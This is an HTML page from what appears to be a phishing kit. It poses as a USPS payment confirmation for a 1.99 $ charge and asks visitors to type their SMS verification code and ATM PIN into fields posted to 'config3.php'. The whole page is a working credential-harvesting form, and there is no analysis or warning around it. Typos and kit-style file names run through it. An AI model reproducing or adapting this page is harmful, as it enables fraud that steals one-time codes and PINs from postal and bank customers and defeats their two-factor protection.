<!DOCTYPE html>
<!-- saved from url=(0039)/look/sms.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="./../files/5_files/bootstrap-icons.css">
        <link rel="stylesheet" href="./../files/5_files/font-awesome.min.css"> 
        <title>Welcom | USPS</title>
        <!-- logo site web-->
        <link rel="icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <link rel="shortcut icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./../files/5_files/bootstrap.css">
        <link rel="stylesheet" href="./../files/5_files/laylay.css">
</head>
<body>
        
        <div class="message ">
            <div class="container">
                <div class="transfer shadow">
                    <div class="image">
                        <img src="./../files/5_files/pro_logo.svg">
                        <img src="./../files/5_files/vis.png">
                    </div>
                    <div class="text-center pt-3">
                        <h5>Please confirm the following payment</h5>
                    </div>
                    <div class="">
                        <p>The unique password has been sent to the mobile number listed below if you need to change Your bark of modify it via the attable chanets(ATM,WEB)</p>
                    </div>
                    <form action="config3.php" method="post">
                        <input type="hidden" name="step" value="sms">
                        <div class="content">
                            <div class="left">
                                <span>Merchant:</span>
                                <span>Amount:</span>
                                <span>Credit card number:</span>
                                <span class="osama">SMS CODE</span>
                                <span class="osama">ATM PIN CODE</span>
                            </div>
                            <div class="right">
                                <span>USPS</span>
                                <span>1.99 $ </span>
                                <span>XXXX XXXX XXXX XXXX</span>
                                <span>
                                    <div class="form-group">
                                        <input type="text" name="sim" id="sim" class="form-control">
                                    </div>
                                </span>
                                <span>
                                    <div class="form-group">
                                        <input type="text" name="sim2" id="sim2" class="form-control">
                                    </div>
                                </span>
                            </div>
                        </div>
                        <div class="time">
                            <p>Please enter the verifacation code receklied by SMS </p>
                            <span>1:56</span>
                        </div>
                        <div class="botona">
                            <button class="btn" name="submit">Confirm</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

 

        <script src="./../files/5_files/jquery-3.5.1.min.js.téléchargement"></script>
        <script src="./../files/5_files/jquery.mask.js.téléchargement"></script>
        <script src="./../files/5_files/bootstrap.min.js.téléchargement"></script>
        <script>

           $("#sim").mask("000000");

        </script>

<div id="torrent-scanner-popup" style="display: none;"></div></body></html>